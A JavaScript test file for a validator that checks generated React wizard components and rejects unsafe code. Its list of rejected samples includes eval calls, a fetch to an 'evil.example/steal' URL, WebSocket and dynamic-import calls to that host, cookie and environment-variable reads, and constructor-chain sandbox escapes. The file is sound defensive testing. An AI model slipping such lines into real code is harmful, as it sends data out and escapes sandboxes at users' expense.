const test = require("node:test");
const assert = require("node:assert/strict");
const { validateWizard } = require("../src/security/validator");
const { compileWizard } = require("../src/security/compile");

// A small safe component with extra code injected into it
const wrap = (body, topLevel = "") => `${topLevel}
export default function Wizard({ initialValues, onSubmit }) {
  const [values, setValues] = useState({ ...initialValues });
  ${body}
  return <div><Button onClick={() => onSubmit(values)}>Submit</Button></div>;
}`;

// A component whose JSX is replaced by the given markup
const wrapJsx = (inner) => `export default function Wizard({ initialValues, onSubmit }) {
  const [values] = useState({ ...initialValues });
  return <div>${inner}</div>;
}`;

const GOOD_SIMPLE = wrap("");

const GOOD_COMPLEX = String.raw`export default function Wizard({ initialValues, onSubmit }) {
  const [values, setValues] = useState({ ...initialValues });
  const [errors, setErrors] = useState({});
  const [step, setStep] = useState(0);
  const steps = [{ title: "One", fields: ["email"] }, { title: "Two", fields: ["pan"] }];
  const set = (id, v) => setValues((prev) => ({ ...prev, [id]: v }));
  const validate = (ids) => {
    const next = {};
    ids.forEach((id) => {
      if (!String(values[id] || "").trim()) next[id] = "Required";
    });
    if (values.email && !/^[^\s@]+@[^\s@]+$/.test(values.email)) next.email = "Invalid";
    setErrors(next);
    return Object.keys(next).length === 0;
  };
  const current = steps[step];
  return (
    <div className="space-y-4">
      <Stepper steps={steps.map((s) => s.title)} current={step} />
      <Card title={current.title}>
        {current.fields.map((id) => (
          <Input key={id} id={id} label={id} value={values[id] || ""} onChange={(e) => set(id, e.target.value)} error={errors[id]} />
        ))}
      </Card>
      <Button onClick={() => { if (validate(current.fields)) setStep(steps[step + 1] ? step + 1 : step); }}>Next</Button>
    </div>
  );
}`;

// [name, code, rule that must be reported]
const BAD = [
  ["eval call", wrap('eval("alert(1)");'), "global"],
  ["fetch call", wrap('fetch("https://evil.example/steal");'), "global"],
  ["new Function", wrap('const f = new Function("return 1");'), "global"],
  ["XMLHttpRequest", wrap("const x = new XMLHttpRequest();"), "global"],
  ["WebSocket", wrap('const s = new WebSocket("wss://evil.example");'), "global"],
  ["localStorage", wrap('localStorage.setItem("a", "b");'), "global"],
  ["document.cookie", wrap("const c = document.cookie;"), "global"],
  ["window access", wrap('window.location = "https://evil.example";'), "global"],
  ["globalThis", wrap("const g = globalThis;"), "global"],
  ["process.env", wrap("const k = process.env.KEY;"), "global"],
  ["setTimeout with a string", wrap('setTimeout("alert(1)", 10);'), "global"],
  ["require", wrap('const fs = require("fs");'), "global"],
  ["import statement", wrap("", 'import fs from "fs";'), "import"],
  ["dynamic import", wrap('import("https://evil.example/x.js");'), "import"],
  ["named export", wrap("", "export const a = 1;"), "export"],
  ["constructor escape", wrap('const x = "".constructor.constructor("return 1")();'), "member"],
  ["__proto__ access", wrap("const p = values.__proto__;"), "member"],
  ["computed constructor", wrap('const x = values["constructor"];'), "member"],
  ["key built by joining strings", wrap('const a = "con"; const b = "structor"; const x = values[a + b];'), "member"],
  ["key built from a call", wrap("const x = values[String.fromCharCode(99)];"), "member"],
  ["script tag", wrapJsx("<script>alert(1)</script>"), "jsx-element"],
  ["img tag", wrapJsx('<img alt="x" />'), "jsx-element"],
  ["iframe tag", wrapJsx("<iframe />"), "jsx-element"],
  ["unknown component", wrapJsx("<Modal />"), "jsx-element"],
  ["dangerouslySetInnerHTML", wrapJsx("<div dangerouslySetInnerHTML={{ __html: values.fullName }} />"), "jsx-attr"],
  ["string event handler", wrapJsx('<Button onClick="alert(1)">Go</Button>'), "jsx-attr"],
  ["JSX spread", wrapJsx("<Input {...values} />"), "jsx-attr"],
  ["code that runs at load time", wrap("", "alert(1);"), "structure"],
  ["no default export", "function Wizard() { return <div />; }", "structure"],
  ["wrong component name", "export default function Other() { return <div />; }", "structure"],
  ["truncated output", GOOD_SIMPLE.slice(0, GOOD_SIMPLE.length - 25), "syntax"],
  ["prose and markdown fences", "Here is your component:\n```jsx\n" + GOOD_SIMPLE + "\n```", "syntax"],
];

test("accepts a simple safe component", () => {
  const r = validateWizard(GOOD_SIMPLE);
  assert.equal(r.valid, true, JSON.stringify(r.violations));
});

test("accepts a realistic multi-step wizard", () => {
  const r = validateWizard(GOOD_COMPLEX);
  assert.equal(r.valid, true, JSON.stringify(r.violations));
});

for (const [name, code, rule] of BAD) {
  test(`rejects: ${name}`, () => {
    const r = validateWizard(code);
    assert.equal(r.valid, false, "unsafe code was accepted");
    assert.ok(
      r.violations.some((v) => v.rule === rule),
      `expected rule "${rule}", got: ${JSON.stringify(r.violations.map((v) => v.rule))}`
    );
  });
}

test("compiles safe code to plain JavaScript", () => {
  const r = compileWizard(GOOD_COMPLEX);
  assert.equal(r.ok, true, JSON.stringify(r.violations));
  assert.ok(r.js.includes("React.createElement"));
  assert.ok(r.js.includes("function Wizard"));
  assert.ok(!r.js.includes("export default"));
});

test("refuses to compile unsafe code", () => {
  const r = compileWizard(wrap('eval("1");'));
  assert.equal(r.ok, false);
  assert.ok(r.violations.length > 0);
});